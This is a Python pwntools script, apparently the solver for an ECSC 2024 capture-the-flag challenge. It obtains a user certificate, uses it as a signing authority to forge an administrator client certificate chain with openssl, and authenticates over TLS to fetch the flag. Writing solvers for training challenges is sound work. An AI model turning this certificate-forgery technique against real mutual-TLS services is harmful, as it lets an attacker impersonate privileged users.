#!/usr/bin/env python3

import ssl
import subprocess as sp

from pwn import *

logging.disable()

HOST = os.environ.get("HOST", "flagsdistribution.challs.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38000))

username = "".join([random.choice(string.ascii_letters) for _ in range(16)])

with remote(HOST, PORT + 1) as r:
    r.recvuntil(b"name: ")
    r.sendline(username.encode())
    r.recvuntil(b"Here is your certificate:")
    certificate = r.recvuntil(b"-----END CERTIFICATE-----").decode().strip()
    r.recvuntil(b"Here is your certificate key:")
    key = r.recvuntil(b"-----END PRIVATE KEY-----").decode().strip()

user_cert = tempfile.mktemp()
with open(user_cert, "w") as f:
    f.write(certificate)

user_cert_key = tempfile.mktemp()
with open(user_cert_key, "w") as f:
    f.write(key)

fakeadmin_key = tempfile.mktemp()
fakeadmin_csr = tempfile.mktemp()
fakeadmin_pem = tempfile.mktemp()

sp.check_call(["openssl", "genrsa", "-out", fakeadmin_key, "2048"], stdout=sp.PIPE)

sp.check_call(["openssl", "req", "-new", "-out", fakeadmin_csr, "-key", fakeadmin_key, "-subj",
               f"/C=IT/CN=FlagsDistributionAdministrator/O=Flags distribution Inc."], stdout=sp.PIPE)

sp.check_call(
    ["openssl", "x509", "-req", "-in", fakeadmin_csr, "-CA", user_cert, "-CAkey", user_cert_key, "-out", fakeadmin_pem,
     "-CAcreateserial", "-days", "365", "-sha256"], stdout=sp.PIPE)

fakeadmin_outer_key = tempfile.mktemp()
fakeadmin_outer_csr = tempfile.mktemp()
fakeadmin_outer_pem = tempfile.mktemp()

sp.check_call(["openssl", "genrsa", "-out", fakeadmin_outer_key, "2048"], stdout=sp.PIPE)

sp.check_call(["openssl", "req", "-new", "-out", fakeadmin_outer_csr, "-key", fakeadmin_outer_key, "-subj",
               f"/C=IT/CN=FlagsDistributionAdministrator/O=Flags distribution Inc."], stdout=sp.PIPE)

sp.check_call(
    ["openssl", "x509", "-req", "-in", fakeadmin_outer_csr, "-CA", fakeadmin_pem, "-CAkey", fakeadmin_key, "-out",
     fakeadmin_outer_pem, "-CAcreateserial", "-days", "365", "-sha256"], stdout=sp.PIPE)

fakeadmin_chain = tempfile.mktemp()
os.system(f"cat {fakeadmin_outer_pem} {fakeadmin_pem} {user_cert} > {fakeadmin_chain}")

context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
context.load_cert_chain(fakeadmin_chain, fakeadmin_outer_key)

with remote(socket.gethostbyname(HOST), PORT, ssl=True, ssl_context=context) as r:
    flag = r.recvline().decode().split("system is ")[-1].strip()
    print(flag)
